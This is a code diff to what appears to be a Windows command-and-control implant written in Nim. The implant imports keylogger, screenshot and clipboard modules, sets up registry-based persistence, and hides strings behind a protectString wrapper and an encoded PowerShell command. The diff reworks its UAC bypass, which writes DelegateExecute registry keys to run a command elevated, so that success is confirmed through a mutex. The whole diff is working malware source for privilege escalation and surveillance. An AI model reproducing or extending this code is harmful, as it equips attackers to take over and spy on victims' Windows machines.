@@ -1,7 +1,7 @@
 # Internal imports
 import ../config
 import ../common
-import utils/[audio, clipboard, clr, helpers, memops, misc, screenshot, keylogger]
+import utils/[audio, clipboard, clr, helpers, memops, misc, screenshot, keylogger, mutex]
 # Internal imports
 import std/[tables, nativesockets, json]
 import winim/[lean, com]
@@ -37,13 +37,13 @@ proc wrap_execute_assembly(assembly_base64: string, assembly_args: string): bool
 proc wrap_patch_func(func_name: string): bool
 proc set_run_key(key_name: string, cmd: string): bool
 proc set_spe(process_name: string, cmd: string): bool
-proc uac_bypass(bypass_method: string, cmd: string, keep_or_die: string): bool
+proc uac_bypass(bypass_method: string, cmd: string): bool
 proc msgbox(title: string, text: string) {.gcsafe.}
 proc speak(text: string): bool
 
 # Helpers
 proc get_windows_agent_id*(): string
-proc is_elevated(): string
+proc is_elevated_str(): string
 
 # Globals
 let client = newHttpClient(userAgent=get_windows_agent_id())
@@ -84,7 +84,7 @@ proc collect_data(): bool =
     except:
         is_admin = could_not_retrieve
     try:
-        is_elevated = is_elevated()
+        is_elevated = is_elevated_str()
     except:
         is_elevated = could_not_retrieve
     try: 
@@ -442,7 +442,7 @@ proc set_spe(process_name: string, cmd: string): bool =
     return is_success
 
 
-proc uac_bypass(bypass_method: string, cmd: string, keep_or_die: string): bool =
+proc uac_bypass(bypass_method: string, cmd: string): bool =
     var is_success = false
     var is_success_post: bool
     var reg_path: string
@@ -459,13 +459,16 @@ proc uac_bypass(bypass_method: string, cmd: string, keep_or_die: string): bool =
         return false
     
     if regWrite(reg_path, "", cmd) and regWrite(reg_path, protectString("DelegateExecute"), ""):
-        sleep(2000)
+        sleep(1000)
         if execCmdEx(launch, options={poDaemon}).exitCode == 0:
-            is_success = true
+            sleep(2000)
+            if is_elevated_mutex_enabled():
+                is_success = true
+            else:
+                is_success = false
 
     var data = {
         protectString("elevated_command"): cmd,
-        protectString("keep_or_die"): keep_or_die,
         protectString("is_success"): $is_success
     }.toOrderedTable
     
@@ -475,7 +478,7 @@ proc uac_bypass(bypass_method: string, cmd: string, keep_or_die: string): bool =
     regDelete(reg_path, "")
     regDelete(reg_path, protectString("DelegateExecute"))
 
-    if is_success == true and keep_or_die == "die":
+    if is_success == true:
         ExitProcess(0)
     else:
         return is_success_post
@@ -543,7 +546,7 @@ proc get_windows_agent_id*(): string =
     return uaid.toLower()
 
 
-proc is_elevated(): string =
+proc is_elevated_str(): string =
     return execute_encoded_powershell(protectString("KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBTAGUAYwB1AHIAaQB0AHkALgBQAHIAaQBuAGMAaQBwAGEAbAAuAFcAaQBuAGQAbwB3AHMAUAByAGkAbgBjAGkAcABhAGwAKABbAFMAeQBzAHQAZQBtAC4AUwBlAGMAdQByAGkAdAB5AC4AUAByAGkAbgBjAGkAcABhAGwALgBXAGkAbgBkAG8AdwBzAEkAZABlAG4AdABpAHQAeQBdADoAOgBHAGUAdABDAHUAcgByAGUAbgB0ACgAKQApACkALgBJAHMASQBuAFIAbwBsAGUAKAAiAEEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAcwAiACkA"))
 
 
@@ -553,6 +556,11 @@ proc is_elevated(): string =
 
 
 proc windows_start*(): void =
+
+    # if elevated - let the unelevated agent know (needed for uac bypass commands)
+    if is_elevated_str().strip() == protectString("True"):
+        discard create_elevated_mutex()
+
     sleep(sleep_on_execution * 1000)
     let binary_path = getAppFilename()
     if is_exe and reloc_on_exec_windows and (binary_path != agent_execution_path_windows):
@@ -615,7 +623,7 @@ proc windows_parse_command*(command: JsonNode): bool =
         of protectString("persist-spe"):
             is_success = set_spe(command[protectString("process_name")].getStr(), command[protectString("persist_command")].getStr())
         of protectString("uac-bypass"):
-            is_success = uac_bypass(command[protectString("bypass_method")].getStr(), command[protectString("elevated_command")].getStr(), command[protectString("keep_or_die")].getStr())
+            is_success = uac_bypass(command[protectString("bypass_method")].getStr(), command[protectString("elevated_command")].getStr())
         of protectString("msgbox"):
             # spawn in a new thread
             var title = command[protectString("title")].getStr()
